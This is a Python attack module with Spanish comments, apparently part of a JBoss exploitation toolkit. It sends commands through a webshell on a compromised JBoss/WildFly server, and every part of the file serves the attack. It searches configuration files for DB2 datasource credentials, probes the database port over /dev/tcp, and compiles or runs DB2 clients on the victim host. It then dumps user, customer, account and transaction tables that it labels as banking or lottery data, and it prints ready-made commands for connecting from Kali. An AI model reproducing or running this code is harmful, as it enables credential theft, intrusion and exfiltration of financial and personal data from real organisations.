# -*- coding: utf-8 -*-
"""
PANTER JBOSS - Modulo de Soporte DB2
Analyst : Apo1o13
Build   : 2026-04-30

Extraccion de credenciales DB2 desde security-domains de JBoss,
conexion via CLI/JDBC y dump de tablas de usuarios.
"""

import re
import sys
from time import sleep

try:
    from urllib.parse import urlencode
except ImportError:
    from urllib import urlencode

RED    = '\x1b[91m'
GREEN  = '\033[32m'
BOLD   = '\033[1m'
ENDC   = '\033[0m'
YELLOW = '\033[93m'
CYAN   = '\033[96m'
WHITE  = '\033[97m'
MAGENTA= '\033[95m'


def _p(msg):
    print(msg); sys.stdout.flush()


def _exec(http_pool, url, path, headers, cmd, timeout=25):
    try:
        encoded = urlencode({"ppp": cmd})
        r = http_pool.request('GET', url + path + encoded,
                              redirect=False, headers=headers)
        if r.status == 404:
            return ""
        resp = str(r.data)
        try:
            out = resp.split("pre>")[1]
            out = re.sub(r'</?\w+[^>]*>', '', out)
            return out.replace('\\n', '\n').replace('\\t', '\t').strip()
        except:
            return ""
    except:
        return ""


# ══════════════════════════════════════════════
#  PASO A: Extraer credenciales de security-domains
# ══════════════════════════════════════════════

def extraer_credenciales_db2(http_pool, url, path, headers):
    """
    Lee login-config.xml, standalone.xml y *-ds.xml para extraer credenciales
    reales de security-domains DB2 en JBoss/WildFly.
    Retorna lista de dicts: {db_host, db_port, db_name, user, password, fuente}
    """
    _p(CYAN + BOLD + "\n  [DB2] Extrayendo credenciales de security-domains JBoss..." + ENDC)

    credenciales = []

    # 1. Buscar todos los archivos de configuracion relevantes
    #    Incluye standalone.xml (WildFly/JBoss AS7+) ademas de los classicos
    find_cmd = (
        "find / \\( -name 'login-config.xml' -o -name '*-ds.xml' "
        "-o -name 'standalone.xml' -o -name 'standalone-full.xml' "
        "-o -name '*.properties' -o -name 'jboss-web.xml' "
        "-o -name '*-service.xml' \\) 2>/dev/null "
        "| grep -v proc | grep -v '/sys/' | head -40"
    )
    archivos_raw = _exec(http_pool, url, path, headers, find_cmd)
    archivos = [l.strip() for l in archivos_raw.split('\n') if l.strip()]

    if not archivos:
        _p(YELLOW + "  [DB2] No se encontraron archivos de configuracion." + ENDC)
        return credenciales

    _p(GREEN + "  [DB2] %d archivos de configuracion encontrados." % len(archivos) + ENDC)

    # Mapa: security_domain_name -> {user, password}
    security_domains = {}

    # 2a. Parsear login-config.xml (JBoss 4/5/6)
    login_configs = [f for f in archivos if 'login-config' in f.lower()]
    for lc in login_configs:
        contenido = _exec(http_pool, url, path, headers, "cat '%s' 2>/dev/null" % lc)
        if not contenido:
            continue
        _parsear_login_config(contenido, security_domains)

    # 2b. Parsear standalone.xml (WildFly / JBoss AS7+)
    standalone_files = [f for f in archivos if 'standalone' in f.lower() and f.endswith('.xml')]
    for sf in standalone_files:
        contenido = _exec(http_pool, url, path, headers, "cat '%s' 2>/dev/null" % sf)
        if not contenido:
            continue
        _parsear_standalone_xml(contenido, security_domains, credenciales, sf)

    # 2c. Grep directo en directorios conf — fallback cuando el XML es ilegible
    grep_dirs = [
        "/opt/jboss/server/default/conf/",
        "/opt/jboss/server/production/conf/",
        "/opt/wildfly/standalone/configuration/",
        "/etc/jbossas/",
        "/jboss/",
    ]
    for d in grep_dirs:
        raw = _exec(http_pool, url, path, headers,
                    "grep -rn 'password\\|userName\\|user-name' '%s' 2>/dev/null | head -30" % d)
        if raw:
            _parsear_grep_output(raw, security_domains)

    if security_domains:
        _p(GREEN + BOLD + "  [DB2] Security-domains encontrados: %s" % list(security_domains.keys()) + ENDC)
    else:
        _p(YELLOW + "  [DB2] No se encontraron security-domains con credenciales." + ENDC)

    # 3. Cruzar datasources DB2 con security-domains
    ds_files = [f for f in archivos if f.endswith('-ds.xml') or 'datasource' in f.lower()]
    for ds_file in ds_files:
        contenido = _exec(http_pool, url, path, headers, "cat '%s' 2>/dev/null" % ds_file)
        if not contenido or 'db2' not in contenido.lower():
            continue
        _cruzar_datasource_db2(contenido, ds_file, security_domains, credenciales)

    # 4. Buscar en archivos .properties
    props_files = [f for f in archivos if f.endswith('.properties')]
    for pf in props_files:
        contenido = _exec(http_pool, url, path, headers, "cat '%s' 2>/dev/null" % pf)
        if not contenido or 'db2' not in contenido.lower():
            continue
        _buscar_en_properties(contenido, pf, credenciales)

    # 5. Fallback final: grep agresivo en todo /opt buscando strings DB2
    if not credenciales:
        _p(YELLOW + "  [DB2] Sin credenciales via XML — intentando grep agresivo..." + ENDC)
        grep_db2 = _exec(http_pool, url, path, headers,
                         "grep -rn --include='*.xml' --include='*.properties' "
                         "'jdbc:db2' /opt/ /etc/ /jboss/ 2>/dev/null | head -20")
        if grep_db2:
            _p(CYAN + "  [DB2] Resultados grep jdbc:db2:\n" + WHITE + grep_db2 + ENDC)
            # Intentar extraer del grep output
            conn_re = re.compile(r'jdbc:db2://([^:/]+):?(\d+)/(\w+)', re.IGNORECASE)
            for m in conn_re.finditer(grep_db2):
                db_host = m.group(1)
                db_port = m.group(2) or '50000'
                db_name = m.group(3)
                # Buscar user/pass en la misma linea o lineas adyacentes
                linea = grep_db2[max(0, m.start()-200):m.end()+200]
                um = re.search(r'(?:user|USER)["\'\s=:>]+([A-Za-z0-9_\-\.@]+)', linea)
                pm = re.search(r'(?:password|PASSWORD|passwd)["\'\s=:>]+([^\s"\'<&]{3,30})', linea)
                entrada = {
                    'db_host': db_host,
                    'db_port': db_port,
                    'db_name': db_name,
                    'user':    um.group(1) if um else '',
                    'password':pm.group(1) if pm else '',
                    'fuente':  'grep agresivo',
                }
                if entrada not in credenciales:
                    credenciales.append(entrada)

    _p(CYAN + "  [DB2] Total credenciales DB2 encontradas: %d\n" % len(credenciales) + ENDC)
    return credenciales


def _parsear_login_config(contenido, security_domains):
    """Extrae usuarios y passwords de login-config.xml."""
    policy_re = re.compile(
        r'<application-policy[^>]+name=["\']([^"\']+)["\'][^>]*>(.*?)</application-policy>',
        re.DOTALL | re.IGNORECASE)

    for match in policy_re.finditer(contenido):
        domain_name = match.group(1)
        block       = match.group(2)

        user_m = re.search(
            r'module-option[^>]+name=["\'](?:userName|principal|username)["\'][^>]*>\s*([^<]+)',
            block, re.IGNORECASE)
        pass_m = re.search(
            r'module-option[^>]+name=["\']password["\'][^>]*>\s*([^<]+)',
            block, re.IGNORECASE)

        if user_m or pass_m:
            security_domains[domain_name] = {
                'user':     user_m.group(1).strip() if user_m else '',
                'password': pass_m.group(1).strip() if pass_m else '',
            }
            _p(GREEN + "  [DB2] Security-domain '%s': %s / %s" % (
                domain_name,
                security_domains[domain_name]['user'],
                security_domains[domain_name]['password']) + ENDC)


def _parsear_standalone_xml(contenido, security_domains, credenciales, archivo):
    """
    Extrae credenciales de standalone.xml (WildFly/JBoss AS7+).
    El formato usa <datasource>, <security>, <user-name>, <password> y
    <security-domain> dentro de cada datasource.
    """
    # Buscar bloques <datasource ...> ... </datasource>
    ds_re = re.compile(r'<datasource[^>]*>(.*?)</datasource>', re.DOTALL | re.IGNORECASE)
    for ds_match in ds_re.finditer(contenido):
        block = ds_match.group(1)
        if 'db2' not in block.lower():
            continue

        conn_re = re.compile(r'<connection-url>\s*jdbc:db2://([^:/]+):?(\d*)/(\w+)', re.IGNORECASE)
        conn_m  = conn_re.search(block)
        if not conn_m:
            continue

        db_host = conn_m.group(1).strip()
        db_port = conn_m.group(2).strip() or '50000'
        db_name = conn_m.group(3).strip()

        # Usuario y password directo en el datasource
        um = re.search(r'<user-name>\s*([^<]+)\s*</user-name>', block, re.IGNORECASE)
        pm = re.search(r'<password>\s*([^<]+)\s*</password>', block, re.IGNORECASE)
        # O via security-domain referenciado
        sm = re.search(r'<security-domain>\s*([^<]+)\s*</security-domain>', block, re.IGNORECASE)

        user = um.group(1).strip() if um else ''
        pwd  = pm.group(1).strip() if pm else ''

        if sm and (not user or not pwd):
            dom = sm.group(1).strip()
            if dom in security_domains:
                user = user or security_domains[dom]['user']
                pwd  = pwd  or security_domains[dom]['password']

        entrada = {
            'db_host': db_host, 'db_port': db_port, 'db_name': db_name,
            'user': user, 'password': pwd, 'fuente': archivo,
        }
        if entrada not in credenciales:
            credenciales.append(entrada)
            _p(GREEN + BOLD + "  [DB2] CREDENCIAL (standalone.xml): %s:%s@%s:%s/%s" % (
                user, pwd, db_host, db_port, db_name) + ENDC)

    # Extraer security-domain con credentials en standalone.xml
    sec_re = re.compile(
        r'<security-domain[^>]+name=["\']([^"\']+)["\'][^>]*>(.*?)</security-domain>',
        re.DOTALL | re.IGNORECASE)
    for m in sec_re.finditer(contenido):
        dom  = m.group(1)
        blk  = m.group(2)
        um   = re.search(r'name=["\'](?:userName|username)["\'][^>]*>\s*([^<]+)', blk, re.IGNORECASE)
        pm   = re.search(r'name=["\']password["\'][^>]*>\s*([^<]+)', blk, re.IGNORECASE)
        if um or pm:
            security_domains[dom] = {
                'user':     um.group(1).strip() if um else '',
                'password': pm.group(1).strip() if pm else '',
            }


def _parsear_grep_output(raw, security_domains):
    """Extrae pares user/pass de salida grep de archivos conf."""
    user_re = re.compile(r'(?:userName|user-name|username)[>\s=:\"\']+([A-Za-z0-9_\-\.@]+)', re.IGNORECASE)
    pass_re = re.compile(r'(?:password)[>\s=:\"\']+([^\s"\'<&]{3,30})', re.IGNORECASE)

    users = user_re.findall(raw)
    passes = pass_re.findall(raw)

    for i, u in enumerate(users):
        if i < len(passes):
            # Agrupamos como domain "grep_N"
            key = "grep_%d" % i
            security_domains[key] = {'user': u.strip(), 'password': passes[i].strip()}


def _cruzar_datasource_db2(contenido, ds_file, security_domains, credenciales):
    """Cruza un archivo -ds.xml con los security-domains ya mapeados."""
    url_re  = re.compile(r'<connection-url>\s*jdbc:db2://([^:/]+):?(\d*)/(\w+)', re.IGNORECASE)
    dom_re  = re.compile(r'<security-domain>\s*([^<]+)\s*</security-domain>', re.IGNORECASE)
    user_re = re.compile(r'<user-name>\s*([^<]+)\s*</user-name>', re.IGNORECASE)
    pass_re = re.compile(r'<password>\s*([^<]+)\s*</password>', re.IGNORECASE)

    for conn_match in url_re.finditer(contenido):
        db_host = conn_match.group(1).strip()
        db_port = conn_match.group(2).strip() or '50000'
        db_name = conn_match.group(3).strip()

        dom_match  = dom_re.search(contenido)
        user_match = user_re.search(contenido)
        pass_match = pass_re.search(contenido)

        user = ''
        pwd  = ''

        if dom_match:
            dom_name = dom_match.group(1).strip()
            if dom_name in security_domains:
                user = security_domains[dom_name]['user']
                pwd  = security_domains[dom_name]['password']
            else:
                # Intentar busqueda parcial del nombre de dominio
                for k, v in security_domains.items():
                    if dom_name.lower() in k.lower() or k.lower() in dom_name.lower():
                        user = v['user']
                        pwd  = v['password']
                        break

        if not user and user_match:
            user = user_match.group(1).strip()
        if not pwd and pass_match:
            pwd  = pass_match.group(1).strip()

        entrada = {
            'db_host': db_host, 'db_port': db_port, 'db_name': db_name,
            'user': user, 'password': pwd, 'fuente': ds_file,
        }
        if entrada not in credenciales:
            credenciales.append(entrada)
            if user or pwd:
                _p(GREEN + BOLD + "  [DB2] CREDENCIAL: %s:%s@%s:%s/%s" % (
                    user, pwd, db_host, db_port, db_name) + ENDC)
            else:
                _p(YELLOW + "  [DB2] DB sin credenciales en XML: %s:%s/%s (security-domain no mapeado)" % (
                    db_host, db_port, db_name) + ENDC)


def _buscar_en_properties(contenido, pf, credenciales):
    """Extrae credenciales DB2 de archivos .properties."""
    host_m = re.search(r'(?:db\.?host|db2\.host)\s*=\s*(\S+)', contenido, re.IGNORECASE)
    user_m = re.search(r'(?:db\.?user|db2\.user|username)\s*=\s*(\S+)', contenido, re.IGNORECASE)
    pass_m = re.search(r'(?:db\.?pass|db2\.pass|password)\s*=\s*(\S+)', contenido, re.IGNORECASE)
    port_m = re.search(r'(?:db\.?port|db2\.port)\s*=\s*(\d+)', contenido, re.IGNORECASE)
    name_m = re.search(r'(?:db\.?name|db2\.name|database)\s*=\s*(\S+)', contenido, re.IGNORECASE)

    if host_m and (user_m or pass_m):
        entrada = {
            'db_host':  host_m.group(1).strip(),
            'db_port':  port_m.group(1).strip() if port_m else '50000',
            'db_name':  name_m.group(1).strip() if name_m else '',
            'user':     user_m.group(1).strip() if user_m else '',
            'password': pass_m.group(1).strip() if pass_m else '',
            'fuente':   pf,
        }
        credenciales.append(entrada)
        _p(GREEN + BOLD + "  [DB2] CREDENCIAL (properties): %s:%s@%s" % (
            entrada['user'], entrada['password'], entrada['db_host']) + ENDC)


# ══════════════════════════════════════════════
#  PASO B: Conectar a DB2 y volcar tablas
# ══════════════════════════════════════════════

# Tablas prioritarias en sistemas bancarios/loteria
TABLAS_BANCARIAS = [
    # Usuarios y autenticacion
    'USERS', 'USER', 'USUARIOS', 'CLIENTE', 'CLIENTES',
    'ACCOUNTS', 'ACCOUNT', 'LOGIN', 'CREDENTIALS',
    # Especificas bancarias
    'OPERADOR', 'OPERADORES', 'EMPLEADO', 'EMPLEADOS',
    'PERSONA', 'PERSONAS', 'CUENTA', 'CUENTAS',
    'TRANSACCION', 'TRANSACCIONES', 'MOVIMIENTO',
    # Sistema DB2
    'SYSIBM.SYSAUTHS', 'SYSCAT.DBAUTH',
]


def _db2_cli_disponible(http_pool, url, path, headers):
    out = _exec(http_pool, url, path, headers,
                "which db2 2>/dev/null; db2 -v 2>/dev/null | head -1")
    return bool(out and ('db2' in out.lower() or 'IBM' in out))


def _jdbc_disponible(http_pool, url, path, headers):
    out = _exec(http_pool, url, path, headers,
                "find / -name 'db2jcc*.jar' 2>/dev/null | head -3")
    return out.strip() if out else ""


def _verificar_conectividad_db2(http_pool, url, path, headers, db_host, db_port):
    """Verifica si el servidor DB2 es alcanzable desde la webshell."""
    check = _exec(http_pool, url, path, headers,
                  "(echo >/dev/tcp/%s/%s) 2>/dev/null && echo OPEN || echo CLOSED" % (db_host, db_port))
    return check and "OPEN" in check


def volcar_db2(http_pool, url, path, headers, cred, add_cred_fn, evidencias):
    """
    Conecta a DB2 y vuelca tablas de usuarios.
    Retorna lista de (usuario, password) encontrados.
    """
    db_host = cred['db_host']
    db_port = cred['db_port']
    db_name = cred['db_name']
    user    = cred['user']
    pwd     = cred['password']

    _p(CYAN + "\n  [DB2] Conectando a %s:%s/%s como '%s'..." % (
        db_host, db_port, db_name, user or '???') + ENDC)

    creds_encontradas = []

    # Verificar conectividad primero
    if not _verificar_conectividad_db2(http_pool, url, path, headers, db_host, db_port):
        _p(YELLOW + "  [DB2] Puerto %s:%s CERRADO/no alcanzable desde el servidor." % (
            db_host, db_port) + ENDC)
        return creds_encontradas

    _p(GREEN + "  [DB2] Puerto %s:%s alcanzable." % (db_host, db_port) + ENDC)

    # Si no hay credenciales no podemos conectar
    if not user and not pwd:
        _p(RED + "  [DB2] Sin credenciales para %s/%s. Revise login-config.xml manualmente." % (
            db_host, db_name) + ENDC)
        _mostrar_info_manual(db_host, db_port, db_name, user, pwd)
        return creds_encontradas

    metodo = None

    if _db2_cli_disponible(http_pool, url, path, headers):
        metodo = 'cli'
        _p(GREEN + "  [DB2] Usando DB2 CLI..." + ENDC)

    jdbc_jar = _jdbc_disponible(http_pool, url, path, headers)
    if not metodo and jdbc_jar:
        metodo = 'jdbc'
        _p(GREEN + "  [DB2] Usando JDBC (%s)..." % jdbc_jar.split('\n')[0] + ENDC)

    if not metodo:
        out = _exec(http_pool, url, path, headers,
                    "python3 -c 'import ibm_db; print(\"ok\")' 2>/dev/null")
        if out and 'ok' in out:
            metodo = 'python'
            _p(GREEN + "  [DB2] Usando ibm_db Python..." + ENDC)

    if not metodo:
        _p(YELLOW + "  [DB2] No hay cliente DB2 en el servidor comprometido." + ENDC)
        _mostrar_info_manual(db_host, db_port, db_name, user, pwd)
        return creds_encontradas

    for tabla in TABLAS_BANCARIAS:
        out = _ejecutar_query_db2(
            http_pool, url, path, headers,
            metodo, db_host, db_port, db_name, user, pwd,
            "SELECT * FROM %s FETCH FIRST 50 ROWS ONLY" % tabla,
            jdbc_jar
        )

        if not out or len(out.strip()) < 5:
            continue
        if 'error' in out.lower() and 'sqlcode' in out.lower():
            continue

        _p(GREEN + BOLD + "  [DB2] DATOS en tabla %s:" % tabla + ENDC)
        _p(WHITE + out[:800] + ("..." if len(out) > 800 else "") + ENDC)

        evidencias.append({
            'tipo':    'DB2 Dump',
            'host':    "%s:%s/%s" % (db_host, db_port, db_name),
            'detalle': "Tabla: %s" % tabla,
            'output':  out,
        })

        pares = _parsear_resultado_db2(out)
        for u, p in pares:
            creds_encontradas.append((u, p))
            add_cred_fn("%s:%s/%s" % (db_host, db_port, db_name),
                        u, p, "DB2 dump (%s)" % tabla)
            _p(RED + BOLD + "  [DB2] CREDENCIAL: %s : %s" % (u, p) + ENDC)

    return creds_encontradas


def _mostrar_info_manual(db_host, db_port, db_name, user, pwd):
    """Muestra comandos listos para conectarse manualmente desde Kali."""
    _p(MAGENTA + BOLD +
       "\n  ┌─ CONEXION MANUAL DESDE KALI ───────────────────────────────────\n"
       "  │  Instalar cliente: apt install db2-driver-common ibm-db2  (si no esta)\n"
       "  │\n"
       "  │  Via DB2 CLI:\n"
       "  │    db2 CATALOG TCPIP NODE DB2NODE REMOTE %s SERVER %s\n"
       "  │    db2 CATALOG DATABASE %s AT NODE DB2NODE\n"
       "  │    db2 CONNECT TO %s USER %s USING '%s'\n"
       "  │    db2 \"SELECT * FROM USERS FETCH FIRST 20 ROWS ONLY\"\n"
       "  │\n"
       "  │  Via Squirrel/DBeaver: jdbc:db2://%s:%s/%s (user: %s)\n"
       "  └────────────────────────────────────────────────────────────────\n"
       % (db_host, db_port, db_name, db_name,
          user or '<USER>', pwd or '<PASS>',
          db_host, db_port, db_name, user or '<USER>') + ENDC)


def _ejecutar_query_db2(http_pool, url, path, headers, metodo,
                         db_host, db_port, db_name, user, pwd, query, jdbc_jar=""):
    if metodo == 'cli':
        cmd = ("db2 CONNECT TO %s USER %s USING '%s' && "
               "db2 \"%s\" && db2 DISCONNECT %s 2>/dev/null") % (
               db_name, user, pwd, query, db_name)

    elif metodo == 'jdbc':
        jar = jdbc_jar.split('\n')[0].strip()
        java_script = (
            "import java.sql.*; "
            "public class Q { public static void main(String[] a) throws Exception { "
            "Class.forName(\\\"com.ibm.db2.jcc.DB2Driver\\\"); "
            "Connection c = DriverManager.getConnection("
            "\\\"jdbc:db2://%s:%s/%s\\\",\\\"%s\\\",\\\"%s\\\"); "
            "ResultSet r = c.createStatement().executeQuery(\\\"%s\\\"); "
            "ResultSetMetaData m = r.getMetaData(); "
            "for(int i=1;i<=m.getColumnCount();i++) System.out.print(m.getColumnName(i)+\\\"|\\\"); "
            "System.out.println(); "
            "while(r.next()){for(int i=1;i<=m.getColumnCount();i++) "
            "System.out.print(r.getString(i)+\\\"|\\\"); System.out.println();} "
            "c.close();}}"
        ) % (db_host, db_port, db_name, user, pwd, query.replace('"', '\\"'))

        cmd = ("cd /tmp && echo '%s' > Q.java && "
               "javac -cp %s Q.java 2>/dev/null && "
               "java -cp .:%s Q 2>/dev/null && "
               "rm -f Q.java Q.class") % (java_script, jar, jar)

    elif metodo == 'python':
        cmd = ("python3 -c \""
               "import ibm_db; "
               "conn = ibm_db.connect('DATABASE=%s;HOSTNAME=%s;PORT=%s;"
               "UID=%s;PWD=%s;','',''); "
               "stmt = ibm_db.exec_immediate(conn, '%s'); "
               "row = ibm_db.fetch_assoc(stmt); "
               "while row: print(row); row = ibm_db.fetch_assoc(stmt)"
               "\" 2>/dev/null") % (db_name, db_host, db_port, user, pwd, query)
    else:
        return ""

    return _exec(http_pool, url, path, headers, cmd, timeout=35)


def _parsear_resultado_db2(texto):
    pares = []
    user_cols = ['user', 'username', 'login', 'email', 'usuario',
                 'nombre', 'name', 'account', 'operador', 'persona']
    pass_cols = ['pass', 'password', 'passwd', 'pwd', 'hash',
                 'clave', 'contrasena', 'secret', 'token']

    lineas = [l.strip() for l in texto.split('\n') if l.strip()]
    if len(lineas) < 2:
        return pares

    if '|' in lineas[0]:
        headers = [h.strip().lower() for h in lineas[0].split('|') if h.strip()]
        u_idx = next((i for i, h in enumerate(headers)
                      if any(k in h for k in user_cols)), None)
        p_idx = next((i for i, h in enumerate(headers)
                      if any(k in h for k in pass_cols)), None)

        if u_idx is not None and p_idx is not None:
            for linea in lineas[1:]:
                cols = [c.strip() for c in linea.split('|')]
                try:
                    u = cols[u_idx]
                    p = cols[p_idx]
                    if u and p and u != '-' and p != '-':
                        pares.append((u, p))
                except:
                    continue

    return pares


# ══════════════════════════════════════════════
#  PUNTO DE ENTRADA
# ══════════════════════════════════════════════

def ejecutar_ataque_db2(http_pool, url, path, headers, add_cred_fn, evidencias):
    """
    Orquesta el ataque completo a DB2:
    1. Extrae credenciales de security-domains (login-config.xml + standalone.xml)
    2. Verifica conectividad TCP antes de intentar dump
    3. Se conecta y vuelca tablas con el metodo disponible
    4. Muestra comandos manuales si no hay cliente local
    """
    _p(RED + BOLD +
       "\n  ╔══════════════════════════════════════════════════════════╗\n"
       "  ║            MODULO DB2 — ATAQUE ESPECIALIZADO             ║\n"
       "  ╚══════════════════════════════════════════════════════════╝\n" + ENDC)

    todas_creds = []

    credenciales_ds = extraer_credenciales_db2(http_pool, url, path, headers)

    if not credenciales_ds:
        _p(YELLOW + "  [DB2] No se encontraron datasources DB2 configurados.\n" + ENDC)
        return todas_creds

    # Mostrar resumen de lo encontrado
    _p(CYAN + "\n  [DB2] Datasources DB2 a atacar:\n" + ENDC)
    for i, c in enumerate(credenciales_ds, 1):
        _p(WHITE + "  %d. %s:%s/%s  user='%s'  pass='%s'" % (
            i, c['db_host'], c['db_port'], c['db_name'],
            c.get('user', ''), c.get('password', '')) + ENDC)
    _p("")

    for cred in credenciales_ds:
        nuevas = volcar_db2(http_pool, url, path, headers, cred, add_cred_fn, evidencias)
        todas_creds.extend(nuevas)

    if todas_creds:
        _p(GREEN + BOLD +
           "\n  [DB2] Total de credenciales extraidas: %d\n" % len(todas_creds) + ENDC)
    else:
        _p(YELLOW + "\n  [DB2] No se volcaron datos automaticamente.\n"
           "  [DB2] Use los comandos manuales mostrados arriba para conectarse desde Kali.\n" + ENDC)

    return todas_creds
